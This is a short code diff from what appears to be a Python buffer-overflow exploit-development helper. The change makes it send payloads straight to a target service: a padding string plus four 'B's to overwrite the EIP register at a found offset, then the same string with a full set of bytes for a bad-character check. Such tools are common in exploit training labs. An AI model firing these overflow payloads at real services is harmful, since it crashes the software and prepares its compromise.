@@ -7,6 +7,7 @@ import sys
 from IPy import IP
 from create_pattern import Pattern
 import user_input
+from bad_characters import bad_characters
 
 
 class Main:
@@ -61,13 +62,13 @@ class Main:
             print(f"[*] Offset detected at {offset} bytes\n")
 
             print("[*] Targeting EIP with all 'B's...\n")
-            fuzz.confirm_eip(offset)
+            fuzz.send_payload("A" * offset + "B" * 4)
 
             print("[!] Waiting for application to restart.\n")
             fuzz.is_target_up()
 
             print("[*] Sending all chars for bad char check...\n")
-            fuzz.check_bad_chars(offset)
+            fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
             sys.exit()
 
         else:
